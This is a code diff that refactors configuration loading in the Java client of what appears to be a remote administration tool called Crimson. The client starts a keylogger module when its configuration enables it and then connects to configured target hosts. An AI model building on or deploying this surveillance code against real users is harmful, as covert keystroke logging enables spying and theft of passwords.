@@ -26,22 +26,19 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
-import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.BasicDatabase;
 import com.subterranean_security.crimson.core.storage.StorageFacility;
-import com.subterranean_security.crimson.core.util.B64Util;
 import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
 import com.subterranean_security.crimson.universal.stores.Database;
 
 public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
-
-	public static ClientConfig ic;
 
 	public static void main(String[] args) {
 
@@ -60,12 +57,8 @@ public class Client {
 
 		// Initialize database
 		initializeDatabase();
-		try {
-			ic = ClientConfig.parseFrom(B64Util.decode(Database.getFacility().getString("ic")));
-		} catch (Exception e) {
-			log.error("Internal configuration not found");
-			System.exit(0);
-		}
+
+		ConfigStore.loadConfig();
 
 		try {
 			Common.cvid = Database.getFacility().getInteger("cvid");
@@ -74,9 +67,10 @@ public class Client {
 
 		log.debug("CVID: {}", Common.cvid);
 
-		if (ic.getKeylogger()) {
+		if (ConfigStore.getConfig().getKeylogger()) {
 			try {
-				Keylogger.start(ic.getKeyloggerFlushMethod(), ic.getKeyloggerFlushValue());
+				Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
+						ConfigStore.getConfig().getKeyloggerFlushValue());
 			} catch (HeadlessException e) {
 				// ignore
 			} catch (Exception e) {
@@ -84,7 +78,7 @@ public class Client {
 			}
 		}
 
-		ConnectionStore.setTargets(ic.getTargetList());
+		ConnectionStore.setTargets(ConfigStore.getConfig().getTargetList());
 		ConnectionStore.connectionRoutine();
 
 	}
@@ -106,10 +100,6 @@ public class Client {
 		}
 
 		Database.setFacility(sf);
-	}
-
-	public static void saveIC() {
-		Database.getFacility().store("ic", new String(B64Util.encode(ic.toByteArray())));
 	}
 
 	public static AuthenticationGroup getGroup() {
